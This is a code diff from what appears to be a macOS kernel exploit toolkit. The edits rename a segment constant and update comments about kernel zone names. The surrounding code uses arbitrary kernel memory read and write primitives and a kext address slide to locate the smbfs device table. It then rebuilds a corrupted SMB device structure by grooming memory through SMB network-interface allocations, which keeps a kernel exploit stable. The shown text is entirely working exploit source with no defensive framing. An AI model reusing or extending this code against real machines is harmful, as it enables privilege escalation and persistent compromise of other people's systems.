@@ -30,7 +30,7 @@ int xpl_safe_release_fd_to_dtab_idx(int fd) {
 
 
 uintptr_t xpl_safe_release_fd_to_dev(int fd, xpl_slider_kext_t slider) {
-    uintptr_t smb_dtab = xpl_slider_kext_slide(slider, xpl_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
+    uintptr_t smb_dtab = xpl_slider_kext_slide(slider, XPL_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
     return xpl_kmem_read_ptr(smb_dtab, xpl_safe_release_fd_to_dtab_idx(fd) * sizeof(uintptr_t));
 }
 
@@ -62,11 +62,11 @@ void xpl_safe_release_restore_smb_dev(const struct sockaddr_in* addr, int fd, co
         uintptr_t dev = xpl_safe_release_fd_to_dev(fd, slider);
         xpl_kmem_write(dev, 0, backup, sizeof(*backup));
     } else {
-        /// No valid memory, we have to find one from kext.48 zone
+        /// No valid memory, we have to find one from default.48 zone
         smb_nic_allocator allocator = smb_nic_allocator_create(addr, sizeof(*addr));
         
         /// Associate a socket address with length sizeof(struct smb_dev). The memory for
-        /// this socket address will be allocated from kext.48 zone
+        /// this socket address will be allocated from default.48 zone
         struct network_nic_info info;
         bzero(&info, sizeof(info));
         info.addr_4.sin_len = sizeof(*backup);
@@ -90,7 +90,7 @@ void xpl_safe_release_restore_smb_dev(const struct sockaddr_in* addr, int fd, co
         /// Associate the stolen memory to smb device
         xpl_kmem_write(addr, 0, backup, sizeof(*backup));
         int dtab_idx = xpl_safe_release_fd_to_dtab_idx(fd);
-        uintptr_t dtab = xpl_slider_kext_slide(slider, xpl_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
+        uintptr_t dtab = xpl_slider_kext_slide(slider, XPL_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
         xpl_kmem_write_uint64(dtab, dtab_idx * sizeof(uintptr_t), addr);
     }
 }
